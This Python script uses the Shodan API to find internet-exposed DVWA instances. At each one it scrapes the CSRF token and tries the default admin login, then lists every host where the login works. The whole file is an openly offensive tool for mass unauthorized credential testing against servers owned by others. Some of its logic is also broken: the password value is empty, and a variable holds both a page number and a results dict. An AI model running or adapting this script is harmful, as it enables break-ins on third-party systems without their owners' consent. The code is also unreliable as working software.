import shodan
import time
import requests
import re

# Replace 'YOUR_API_KEY' with your actual Shodan API key
SHODAN_API_KEY = 'YOUR_API_KEY'
api = shodan.Shodan(SHODAN_API_KEY)

# Function to request a page of data from Shodan
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            # Handle Shodan API errors, wait for 5 seconds before retrying
            print(f"Error: {e}")
            time.sleep(5)

# Function to check if default credentials work on a DVWA instance
def has_valid_credentials(instance):
    # Create a session for making HTTP requests
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    
    try:
        # Visit the login.php page to get the CSRF token
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        # Return False if a connection error occurs
        return False
    
    # Search the CSRF token using regex
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    
    # Try to log in with admin:password and the obtained CSRF token
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-type': 'application/x-www-form-urlencoded'}    
    )
    
    # Check if the login attempt was successful (redirects to index.php)
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        # Authentication success
        return True
    else:
        # Authentication failed
        return False

# Function to process a page of Shodan results and check credentials
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] Valid credentials at: {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result
    
# Function to search Shodan using the given query and iterate over each page of results
def query_shodan(query):
    print("[*] Querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        # Remove or comment out the break statement for continuous iteration
        # break
        print(f"Querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# Search for DVWA instances and print the results
res = query_shodan('title:dvwa')
print(res)
